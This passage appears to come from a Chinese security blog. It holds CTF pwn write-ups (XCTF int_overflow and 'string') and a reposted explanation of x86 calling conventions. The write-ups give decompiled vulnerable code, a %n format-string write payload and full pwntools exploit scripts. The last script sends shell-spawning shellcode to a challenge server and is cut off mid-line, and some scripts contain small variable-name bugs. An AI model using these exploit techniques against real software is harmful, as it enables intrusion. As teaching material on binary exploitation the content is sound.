* "a" + str(p64(3),encoding="unicode_escape")r.recvline("your name!")r.sendline(payload)num = "1211451525"for i in num: r.recvline("guess number:") r.sendline(i)r.interactive() 5.存在的问题 网上用到了这样的exp 1234567891011121314151617181920#!python#!/usr/bin/env python# coding=utf-8 from pwn import *from ctypes import * p = process('./d22084e1938f4b21a380e38e2fb48629')# p = remote("111.198.29.45", 39368)libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6") payload = 'A'*0x20 + p64(1) p.sendlineafter('Your name:', payload)libc.srand(1)for i in range(10): num = str(libc.rand()%6 + 1) print num + '\n' p.sendlineafter('number:',num)p.interactive() 0x05 int_overflow 1.相关知识点 数据类型大小：会产生溢出的情况 2.解题思路 12# file int_overflow int_overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped int_overflow文件是一个32位的ELF文件 1234567# checksec int_overflow [*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/int_flow/int_overflow&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 只开启了栈不可执行保护 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// main函数int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+Ch] [bp-Ch]@1 setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); puts("---------------------"); puts("~~ Welcome to CTF! ~~"); puts(" 1.Login "); puts(" 2.Exit "); puts("---------------------"); printf("Your choice:"); __isoc99_scanf("%d", &amp;v4); if ( v4 == 1 ) &#123; login(); &#125; else &#123; if ( v4 == 2 ) &#123; puts("Bye~"); exit(0); &#125; puts("Invalid Choice!"); &#125; return 0;&#125;// login()函数char *login()&#123; char buf; // [sp+0h] [bp-228h]@1 char s; // [sp+200h] [bp-28h]@1 memset(&amp;s, 0, 0x20u); memset(&amp;buf, 0, 0x200u); puts("Please input your username:"); read(0, &amp;s, 0x19u); printf("Hello %s\n", &amp;s); puts("Please input your passwd:"); read(0, &amp;buf, 0x199u); return check_passwd(&amp;buf);&#125;// check_passwd(&amp;buf)函数char *__cdecl check_passwd(char *s)&#123; char *result; // eax@3 char dest; // [sp+4h] [bp-14h]@3 unsigned __int8 v3; // [sp+Fh] [bp-9h]@1 v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; puts("Invalid Password"); result = (char *)fflush(stdout); &#125; else &#123; puts("Success"); fflush(stdout); result = strcpy(&amp;dest, s); &#125; return result;&#125; 我们将上面的函数关系画一个简单的示意图，如下： 现在对上面的源代码进行详细分析一下：该程序有两三处输入点： 第一个是选择登录或者退出 第二个是输入我们的name 第三个是输入密码，而且passwd的最大输入长度为0x199u，并且在check_passwd检查passwd的长度，如果长度大于3小于等于8的话，输出“Success”，并且返回一个指向最终的目标字符串 dest 的指针result；否则输出“Invalid Password”，结束执行。而dest的位置为ebp-14h。这里还要注意一点就是v3是一个一字节长度的变量，前面对passwd进行长度限制时，最大长度为0x199，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。 3.解题步骤 首先先看一下怎么绕过v3 &lt;= 3u || v3 &gt; 8u，在这里v3是一个单字节变量，且是passwd的长度，而由于passwd最长可以输入0x199长度的字符串，所以我们先算好应该输入多长的passwd才能绕过if的判断语句： 因为v3是单字节，也就是8个bit，正常来说v3为0000 0100到0000 1000区间都可以，也就是在[4,8]区间，如果v3的最高位产生了溢出，比如第9位为1，那么输入的长度应该在1 0000 0100到1 0000 1000，也就是[260,264]区间，在这里我们选择输入的长度为262 观察dest相对ebp的位置，从IDA中可以看出，dest位于ebp-0x14的位置，然后又因为存在一个old ebp，所以前面需要0x14+4=0x18字节的填充； 我们又从IDA中可以找出what_is_this函数，该函数可以打印flag.txt，因为前面已经输入0x14+4+4=0x1c长度的字节，所以现在还剩262-0x1c=234长度的填充，示意图如下：]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】常见调用约定总结]]></title>
    <url>%2F2020%2F05%2F31%2F2020.05.31%EF%BC%88121%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 常见的调用约定一、cdecl调用约定 又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 二、stdcall调用约定(微软命名) Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number 三、fastcall调用约定 stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。 四、thiscall调用约定 C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。 thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。 注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。 五、naked call调用约定 对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数： 代码示例如下(Windows采用Intel汇编语法，注释符为;)： 123456__declspec(naked) int __stdcall function(int a, int b) &#123; ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T) __asm mov eax, a __asm add eax, b __asm ret 8&#125; 注意，__declspec是微软关键字，其他系统上可能没有。 六、pascal调用约定 Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。 Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。 0x01 调用约定的主要特点 Windows下可直接在函数声明前添加关键字stdcall、cdecl或fastcall等标识确定函数的调用方式，如int stdcall func()。Linux下可借用函数attribute 机制，如int attribute((stdcall)) func()。 代码示例如下： 123456789101112int __attribute__((__cdecl__)) CalleeFunc(int i, int j, int k)&#123;// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123; return i+j+k;&#125;void CallerFunc(void)&#123; CalleeFunc(0x11, 0x22, 0x33);&#125;int main(void)&#123; CallerFunc(); return 0;&#125; 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示： 0x02 【扩展】可变参数函数支持条件 **若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。** 首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！ 其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。 C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。 0x03 转载来源 C语言函数调用栈(二)]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-pwn】由浅入深的剖析 "string" 题目]]></title>
    <url>%2F2020%2F05%2F30%2F2020.05.30%EF%BC%88120%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 前言 在上一篇“详解格式化字符串漏洞”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的string题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“详解格式化字符串漏洞”。 0x01 题目分析 1.查看 ELF 文件 12# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped 从上述信息可以看出pwn是一个x86-64位的ELF文件 2.查看文件保护机制 1234567# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 从上述信息中可以看出： pwn文件的结构amd64-64-little， GOT表不可写 有金丝雀，开启了栈保护，因此无法用实现栈溢出 栈不可执行 没有开启地址随机化 3.用 IDA 逆向 下面我将 IDA 逆向的结果放在一起： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190// main函数// 内部含有的函数：sub_400D72(v5);// 功能：打印v5的地址__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // ST88_8@1 _DWORD *v4; // rax@1 __int64 v5; // ST18_8@1 __int64 result; // rax@1 __int64 v7; // rdx@1 v3 = *MK_FP(__FS__, 40LL); setbuf(stdout, 0LL); alarm(0x3Cu); sub_400996(60LL, 0LL); v4 = malloc(8uLL); v5 = (__int64)v4; *v4 = 68; v4[1] = 85; puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;); puts(&quot;we will tell you two secret ...&quot;); printf(&quot;secret[0] is %x\n&quot;, v5, a2); printf(&quot;secret[1] is %x\n&quot;, v5 + 4); puts(&quot;do not tell anyone &quot;); sub_400D72(v5); puts(&quot;The End.....Really?&quot;); result = 0LL; v7 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////// sub_400D72(v5);// 内部含有的函数：sub_400A7D(&quot;Creating a new player.&quot;);sub_400BB9();sub_400CA6(a1);// 功能：创建角色名称，长度不能超过13__int64 __fastcall sub_400D72(__int64 a1)&#123; char s; // [sp+10h] [bp-20h]@1 __int64 v3; // [sp+28h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); puts(&quot;What should your character&apos;s name be:&quot;); _isoc99_scanf(&quot;%s&quot;, &amp;s); if ( strlen(&amp;s) &lt;= 0xC ) &#123; puts(&quot;Creating a new player.&quot;); sub_400A7D(); sub_400BB9(); sub_400CA6(a1); &#125; else &#123; puts(&quot;Hei! What&apos;s up!&quot;); &#125; return *MK_FP(__FS__, 40LL) ^ v3;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////// sub_400A7D();// 内部包含的函数：sub_4009DD(&amp;s1, &quot;up&quot;);// 功能：要求输入“east”才可进行下一步__int64 sub_400A7D()&#123; char s1; // [sp+0h] [bp-10h]@2 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;); puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;); puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;); puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;); puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;); puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;); puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;); puts(&quot;one corner you notice a fireplace.&quot;); puts(&quot;There are two obvious exits: east, up.&quot;); puts(&quot;But strange thing is ,no one there.&quot;); puts(&quot;So, where you will go?east or up?:&quot;); while ( 1 ) &#123; _isoc99_scanf(&quot;%s&quot;, &amp;s1); if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) ) break; puts(&quot;hei! I&apos;m secious!&quot;); puts(&quot;So, where you will go?:&quot;); &#125; if ( strcmp(&amp;s1, &quot;east&quot;) ) &#123; if ( !strcmp(&amp;s1, &quot;up&quot;) ) sub_4009DD(&amp;s1, &quot;up&quot;); puts(&quot;YOU KNOW WHAT YOU DO?&quot;); exit(0); &#125; return *MK_FP(__FS__, 40LL) ^ v2;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////// sub_4009DD();// 内部包含的函数：*// void __noreturn sub_4009DD()&#123; unsigned int v0; // eax@1 int v1; // eax@2 int v2; // [sp+0h] [bp-10h]@2 unsigned int v3; // [sp+4h] [bp-Ch]@2 __int64 v4; // [sp+8h] [bp-8h]@1 v4 = *MK_FP(__FS__, 40LL); puts(&quot;You go right, suddenly, a big hole appear front you!&quot;); puts(&quot;where you will go?!left(0) or right(1)?!:&quot;); v0 = time(0LL); srand(v0); while ( 1 ) &#123; v1 = rand(); v3 = ((((unsigned int)v1 &gt;&gt; 31) + (_BYTE)v1) &amp; 1) - ((unsigned int)v1 &gt;&gt; 31); _isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( v2 != v3 ) break; puts(&quot;You escape it!but another hole appear!&quot;); puts(&quot;where you will go?!left(0) or right(1)?!:&quot;); &#125; puts(&quot;YOU ARE DEAD&quot;); exit(0);&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////// sub_400BB9();// 内部包含的函数：*// 功能：输入一个地址、wish（存在格式化漏洞）__int64 sub_400BB9()&#123; int v1; // [sp+4h] [bp-7Ch]@1 __int64 v2; // [sp+8h] [bp-78h]@1 char format; // [sp+10h] [bp-70h]@2 __int64 v4; // [sp+78h] [bp-8h]@1 v4 = *MK_FP(__FS__, 40LL); v2 = 0LL; puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;); puts(&quot;, what happend?! You just travel , and find another hole&quot;); puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;); puts(&quot;go into there(1), or leave(0)?:&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 == 1 ) &#123; puts(&quot;A voice heard in your mind&quot;); puts(&quot;&apos;Give me an address&apos;&quot;); _isoc99_scanf(&quot;%ld&quot;, &amp;v2); puts(&quot;And, you wish is:&quot;); _isoc99_scanf(&quot;%s&quot;, &amp;format); puts(&quot;Your wish is&quot;); printf(&amp;format, &amp;format); puts(&quot;I hear it, I hear it....&quot;); &#125; return *MK_FP(__FS__, 40LL) ^ v4;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////// sub_400CA6(a1);// 内部包含的函数：mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);// 功能：当满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4) 条件的时候，可以直接输入shellcode，执行我们需要的代码__int64 __fastcall sub_400CA6(__int64 a1)&#123; void *v1; // rsi@2 __int64 v3; // [sp+18h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;); puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;); puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;); puts(&quot;skill! you could not defeat me !&quot;); puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;); if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) ) &#123; puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;); v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL); read(0, v1, 0x100uLL); ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); &#125; return *MK_FP(__FS__, 40LL) ^ v3;&#125;//////////////////////////////////////////////////////////////////////////////////////////////////////////// 为了更加清楚的表示出各个函数之间的关系，我将上面的函数包含关系做了一个示意图，如下： 从上面的图中可以得出这样的结论： 要想使程序执行shellcode就需要使*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)条件成立 该程序一共有 5 处输入，要想程序成功执行shellcode，其中前三个输入被要求为： What should your character's name be: 要求长度不超过13的字符串 So, where you will go?east or up?: 要求输入east go into there(1), or leave(0)?: 要求输入1’ 其中后面两个输入都可以被利用，后面会一一进行讲解 在第5个输入后有一个printf的格式化字符串漏洞 目前上述信息是通过IDA逆向后能到的信息，下面我们简单的运行一下该程序 知识点1：mmap();函数[1] 当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。 原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。 4.运行 pwn 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576Welcome to Dragon Games! .~)&gt;&gt; .~))))&gt;&gt;&gt; .~))&gt;&gt; ___\ .~))&gt;&gt;)))&gt;&gt; .-~))&gt;&gt;\ .~)))))&gt;&gt; .-~))&gt;&gt;)&gt; .~)))&gt;&gt;))))&gt;&gt; .-~)&gt;&gt;)&gt; ) .~))&gt;&gt;))))&gt;&gt; .-~)))))&gt;&gt;)&gt; ( )@@*) //)&gt;)))))) .-~))))&gt;&gt;)&gt; ).@(@@ //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt; (( @.@). //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt; )) )@@*.@@ ) //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt; (( ((@@@.@@ |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt; )) @@*. )@@ ) (\_(\ |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt; (( @@@(.@(@ . _/`-` ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt; )* @@@ )@* (@) (@) |))) //))))))&gt;&gt;))))&gt;&gt; (( @. )@( @ . _/ / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._ )@@ (@@*)@@. (6, 6) / ^ )//))))))&gt;&gt;)))&gt;&gt; ~~-. ( @jgs@@. @@@.*@_ ~^~^~, /\ ^ /)&gt;&gt;))))&gt;&gt; _. `, ((@@ @@@*.(@@ . \^^^/&apos; ( ^ )))&gt;&gt; .&apos; `, ((@@).*@@ )@ ) `-&apos; (( ^ ~)_ / `, (@@. (@@ ). ((( ^ `\ | `. (*.@* / (((( \ \ . `. / ((((( \ \ _.-~\ Y, ; / / (((((( \ \.-~ _.`&quot; _.-~`, ; / / `(((((() ) (((((~ `, ; _/ _/ `&quot;&quot;&quot;/ /&apos; ; ; _.-~_.-~ / /&apos; _.-~ _.&apos; ((((~~ / /&apos; _.-~ __.--~ (((( __.-~ _.-~ .&apos; .~~ : ,&apos;we are wizard, we will give you hand, you can not defeat dragon by yourself ...we will tell you two secret ...secret[0] is 15812a0secret[1] is 15812a4do not tell anyone What should your character&apos;s name be: // 第1处输入&gt; hello,world!Creating a new player. This is a famous but quite unusual inn. The air is fresh and themarble-tiled ground is clean. Few rowdy guests can be seen, and thefurniture looks undamaged by brawls, which are very common in other pubsall around the world. The decoration looks extremely valuable and would fitinto a palace, but in this city it&apos;s quite ordinary. In the middle of theroom are velvet covered chairs and benches, which surround large oakentables. A large sign is fixed to the northern wall behind a wooden bar. Inone corner you notice a fireplace.There are two obvious exits: east, up.But strange thing is ,no one there.So, where you will go?east or up?: // 第2处输入&gt; east You travel a short distance east.That&apos;s odd, anyone disappear suddenly, what happend?! You just travel , and find another holeYou recall, a big black hole will suckk you into it! Know what should you do?go into there(1), or leave(0)?: // 第3处输入&gt; 1A voice heard in your mind&apos;Give me an address&apos; // 第4处输入&gt; 1111And, you wish is: // 第5处输入&gt; nihaoYour wish isnihaoI hear it, I hear it....Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!Dragon say: HaHa! you were supposed to have a normalRPG game, but I have changed it! you have no weapon and skill! you could not defeat me !That&apos;s sound terrible! you meet final boss!but you level is ONE!The End.....Really? 通过正常的输入，发现程序能正常运行，但是并不能满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)，因为v4的值从一开始就被赋值为68，v4[1]的值被赋值为85，所以等式是肯定不成立的。 5.理清思路 经过上述分析之后，现在再理清一下该题目的思路： 我们要想成功执行shellcode，就必须使得v4[0]=v4[1]，那么我们怎么样才能把v4的值改为85，或者把v4[1]的值改为68？ 修改变量值的两种方法： 通过栈溢出，从而达到修改局部变量值的目的，但是本题开启了Canary，所以不容易实现 因为在本题中发现了格式化字符串漏洞，所以可以根据格式化字符串漏洞进行修改，那怎么通过格式化字符串漏洞的手段来修改v4或者v4[1]的值呢？ 在详解格式化字符串漏洞中存在一道例题，就是把变量a的值修改为8，从而执行if分支。我们可以根据那个原理来做本题，这里我们只对v4进行修改，如果相对v4[1]修改的话，可以自己尝试一下。 0x02 解题步骤 1.查找 format 地址的参数偏移 在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该pwn是一个64位的ELF文件，我们在第5个输入处输入AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx，查看结果如下： 通过上图可以发现AAAAAAAA的十六进制4141414141414141使printf函数的第 9 个参数，使格式化字符串的第 8 个参数，我们来验证一下我们的猜想对不对，下面给出在gdb中的调试结果，如下图： 知识点2：64位下的传参约定[2] 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9； 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 知识点3：格式化字符串的控制符[3] %x: 他可以将对应参数的值以16进制打印出来，%x只能打印4个字节，%lx或者%llx可以打8个字节。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。 %s：可以打印对应参数所指向的字符串。 %n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。**还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。**像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入， 2.将 v4 的地址存放在 format 首地址处 和详解格式化字符串漏洞一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 85-8=77 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为： 1payload = str(p64(v4_addr),encoding=&quot;unicode_escape&quot;) + &quot;a&quot;*77 + &quot;%8$n&quot; 如果正常执行的话，栈中和寄存器的情况如下： 那么最终的exp如下： 123456789101112131415161718192021#!python#!/sssusr/bin/env python# coding=utf-8from pwn import *context(log_level = 'debug', arch = 'amd64', os = 'linux',endian="little")#r = remote("124.126.19.106",38510)r = process("./pwn")r.recvuntil("secret[0] is ")v4_addr = int(r.recvuntil("\n",drop=True),16)print("[*] v4_addr is",hex(v3_addr)) payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"print("[+] p64(v4_addr) is",str(p64(v4_addr),encoding="unicode_escape"))r.sendlineafter("What should your character's name be:","LISHUO")r.sendlineafter("So, where you will go?east or up?:","east")r.sendlineafter("go into there(1), or leave(0)?:","1")r.sendlineafter("'Give me an address'","1111")r.sendlineafter("And, you wish is:",payload)r.interactive() 执行该exp文件，并没有得到我们想要的结果（打印出&quot;Wizard: I will help you! USE YOU SPELL&quot;），下图是程序停止的地方： 为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断[3]，但是将\x00其放在字符串的末尾就可以解决了[4]，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：[+] p64(v3_addr) is ÒÔ\x00\x00果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了 [&quot;a&quot;*85][%length$n][padding][v4_addr] 中间部分为%length$n和padding 前部分应该是长度为85的字符串，我们可以用”a“*85进行填充 由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐： ”a“*85：这是85个字符长度 %length$n：由于length不确定，所以该长度不确定 p64(v4_addr)：长度为8 bytes，但是需要地址对齐 我们现在来计算length的值，因为”a“*85的长度除以8等于10.625，又因为前8个”a“是格式化字符串的第8个参数，所以length的数值肯定大于10，如果大于10的话，那么85个”a“和%length$n的长度为90，因为90不能整除8，所以还需要6个字符作为padding，这样算下来(85+5+6)/8=96/8=12，再加上前面7个参数等于19，所以说v4_addr相当于格式化字符串的第20个参数。 经过上述分析，我们又重新得到一个新的exp： 12345678910111213141516171819202122#!python#!/usr/bin/env python# coding=utf-8from pwn import *context(log_level = 'debug', arch = 'amd64', os = 'linux',endian="little")#r = remote("124.126.19.106",38510)r = process("./pwn")r.recvuntil("secret[0] is ")v4_addr = int(r.recvuntil("\n",drop=True),16)print("[*] v4_addr is",hex(v4_addr)) #payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"payload = "a"*85 + "%20$n" + "a"*6 + str(p64(v4_addr),encoding="unicode_escape") print("[+] p64(v4_addr) is",str(p64(v4_addr),encoding="unicode_escape"))r.sendlineafter("What should your character's name be:","LISHUO")r.sendlineafter("So, where you will go?east or up?:","east")r.sendlineafter("go into there(1), or leave(0)?:","1")r.sendlineafter("'Give me an address'","1111")r.sendlineafter("And, you wish is:",payload)r.interactive() 得到的结果如上图，从得到的输出来看，我们已经成功的修改了v4的值，下面我们就写入shellcode，得到flag，完整的exp如下： 12345678910111213141516171819202122232425262728#!python#!/usr/bin/env python# coding=utf-8from pwn import *context(log_level = 'debug', arch = 'amd64', os = 'linux',endian="little")r = remote("124.126.19.106",38510)r.recvuntil("secret[0] is ")v4_addr = int(r.recvuntil("\n",drop=True),16)print("[*] v4_addr is",hex(v3_addr))payload = "a"*85 + "%20$n" + "a"*6 + str(p64(v4_addr),encoding="unicode_escape") print("[+] p64(v4_addr) is",str(p64(v4_addr),encoding="unicode_escape"))# payload = "a"*85 + "%7$nr.sendlineafter("What should your character's name be:","LISHUO")r.sendlineafter("So, where you will go?east or up?:","east")r.sendlineafter("go into there(1), or leave(0)?:","1")r.sendlineafter("'Give me an address'","1111")r.sendlineafter("And, you wish is:",payload)shellcode = asm(shellcraft.sh())r.sendlineafter("Wizard: I will help you! USE YOU 